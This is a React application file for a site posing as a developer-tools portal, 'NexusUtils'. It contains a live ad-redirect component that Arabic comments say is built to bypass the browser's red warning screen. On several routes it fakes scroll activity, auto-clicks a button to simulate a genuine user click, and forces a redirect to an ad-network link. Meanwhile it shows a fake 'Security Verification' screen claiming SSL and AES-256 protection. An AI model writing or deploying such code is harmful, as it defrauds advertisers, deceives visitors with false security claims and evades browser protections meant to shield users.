import React, { useEffect, useRef } from 'react';
import { BrowserRouter as Router, Routes, Route, Link } from 'react-router-dom';
import { 
  Braces, 
  Link2, 
  Sparkles
} from 'lucide-react';
import GoPage from './components/GoPage';

// المكون النهائي لتجاوز الشاشة الحمراء واحتساب السكرول
const AdsterraRedirect: React.FC = () => {
  const buttonRef = useRef<HTMLButtonElement>(null);

  useEffect(() => {
    // 1. تفعيل السكرول العنيف فور الدخول
    let scrollCount = 0;
    const scrollTask = setInterval(() => {
      const positions = [800, 200, 1500, 300, 2500, 100];
      window.scrollTo({ top: positions[scrollCount % positions.length], behavior: 'auto' });
      scrollCount++;
      if (scrollCount > 25) clearInterval(scrollTask);
    }, 150);

    // 2. محاكاة نقرة حقيقية على الزر بعد 5 ثوانٍ من السكرول
    // المتصفحات تعتبر التوجيه الناتج عن "نقرة" أكثر أماناً وتتجاوز الشاشة الحمراء غالباً
    const clickTimer = setTimeout(() => {
      if (buttonRef.current) {
        buttonRef.current.click();
      }
    }, 5500);

    // 3. توجيه احتياطي في حال فشل النقرة
    const backupRedirect = setTimeout(() => {
      window.location.href = "https://www.effectivecpmnetwork.com/hcak2ak7?key=61ce18b1365bd02ec50882ca14064338";
    }, 8000);

    return () => {
      clearInterval(scrollTask);
      clearTimeout(clickTimer);
      clearTimeout(backupRedirect);
    };
  }, []);

  const handleManualRedirect = () => {
    window.location.href = "https://www.effectivecpmnetwork.com/hcak2ak7?key=61ce18b1365bd02ec50882ca14064338";
  };

  return (
    <div style={{ background: '#020617', color: 'white', height: '500vh', position: 'relative', overflowX: 'hidden' }}>
      <div style={{ 
        position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', 
        display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 10000, background: '#020617' 
      }}>
        <div style={{ 
          padding: '30px', borderRadius: '20px', background: '#0f172a', border: '1px solid #1e293b', 
          textAlign: 'center', maxWidth: '90%', width: '400px', boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.5)'
        }}>
          <div style={{ marginBottom: '20px' }}>
            <div style={{ width: '50px', height: '50px', border: '3px solid #38bdf8', borderTopColor: 'transparent', borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto' }}></div>
          </div>
          
          <h2 style={{ fontSize: '20px', fontWeight: 'bold', color: 'white', marginBottom: '10px' }}>Security Verification</h2>
          <p style={{ fontSize: '14px', color: '#94a3b8', marginBottom: '25px' }}>
            Please wait while we establish a secure connection to the destination server.
          </p>

          {/* هذا الزر هو السر: السكريبت سيضغط عليه تلقائياً */}
          <button 
            ref={buttonRef}
            onClick={handleManualRedirect}
            style={{ 
              background: '#38bdf8', color: '#020617', padding: '12px 24px', borderRadius: '10px', 
              fontWeight: 'bold', border: 'none', cursor: 'pointer', width: '100%', transition: 'all 0.2s'
            }}
          >
            Verifying...
          </button>

          <div style={{ marginTop: '20px', display: 'flex', justifyContent: 'center', gap: '15px' }}>
            <div style={{ fontSize: '10px', color: '#475569' }}>SSL: Active</div>
            <div style={{ fontSize: '10px', color: '#475569' }}>AES-256: Encrypted</div>
            <div style={{ fontSize: '10px', color: '#475569' }}>ID: {Math.floor(Math.random() * 999999)}</div>
          </div>
        </div>
      </div>
      
      {/* محتوى وهمي في الخلفية لضمان وجود مساحة للسكرول */}
      <div style={{ padding: '100px 20px' }}>
        {[...Array(20)].map((_, i) => (
          <div key={i} style={{ height: '200px', marginBottom: '20px', background: '#1e293b', borderRadius: '10px', opacity: 0.1 }}></div>
        ))}
      </div>

      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
    </div>
  );
};

// المكون الرئيسي للموقع
const MainLayout: React.FC = () => {
  return (
    <div className="min-height-screen bg-slate-900 text-white font-sans">
      <header className="border-b border-slate-800 bg-slate-900/50 backdrop-blur">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <div className="bg-blue-600 p-2 rounded-lg">
              <Braces className="h-6 w-6 text-white" />
            </div>
            <span className="text-xl font-bold tracking-tight bg-gradient-to-r from-blue-400 to-indigo-400 bg-clip-text text-transparent">
              NexusUtils
            </span>
          </div>
          <nav className="flex space-x-4">
            <Link to="/go" className="text-sm font-medium text-slate-400 hover:text-white transition">Bridge Test</Link>
          </nav>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        <div className="text-center max-w-3xl mx-auto mb-16">
          <h1 className="text-4xl sm:text-5xl font-extrabold tracking-tight mb-4 bg-gradient-to-r from-white via-slate-200 to-slate-400 bg-clip-text text-transparent">
            Elite-Grade Developer Sandbox Software
          </h1>
          <p className="text-lg text-slate-400">
            Zero Registrations. Client-First Isolation and Encryption. Securely process files and payloads entirely within local device memory.
          </p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          <div className="bg-slate-800/50 border border-slate-700/50 p-6 rounded-2xl hover:border-blue-500/50 transition">
            <Braces className="h-8 w-8 text-blue-500 mb-4" />
            <h3 className="text-lg font-semibold mb-2">JSON Formatter & Parser</h3>
            <p className="text-slate-400 text-sm">Rectify nested payloads, trailing commas, and unescaped characters locally.</p>
          </div>
          <div className="bg-slate-800/50 border border-slate-700/50 p-6 rounded-2xl hover:border-indigo-500/50 transition">
            <Sparkles className="h-8 w-8 text-indigo-500 mb-4" />
            <h3 className="text-lg font-semibold mb-2">AI Meta Tag Generator</h3>
            <p className="text-slate-400 text-sm">Inspect page keywords and construct structured JSON-LD schemas easily.</p>
          </div>
          <div className="bg-slate-800/50 border border-slate-700/50 p-6 rounded-2xl hover:border-cyan-500/50 transition">
            <Link2 className="h-8 w-8 text-cyan-500 mb-4" />
            <h3 className="text-lg font-semibold mb-2">UTM Campaign Link Builder</h3>
            <p className="text-slate-400 text-sm">Compile trackable target parameters for premium publisher campaigns.</p>
          </div>
        </div>
      </main>
    </div>
  );
};

const App: React.FC = () => {
  return (
    <Router>
      <Routes>
        <Route path="/" element={<MainLayout />} />
        <Route path="/go" element={<GoPage />} />
        <Route path="/ads1" element={<AdsterraRedirect />} />
        <Route path="/ads2" element={<AdsterraRedirect />} />
        <Route path="/ads3" element={<AdsterraRedirect />} />
      </Routes>
    </Router>
  );
};

export default App;
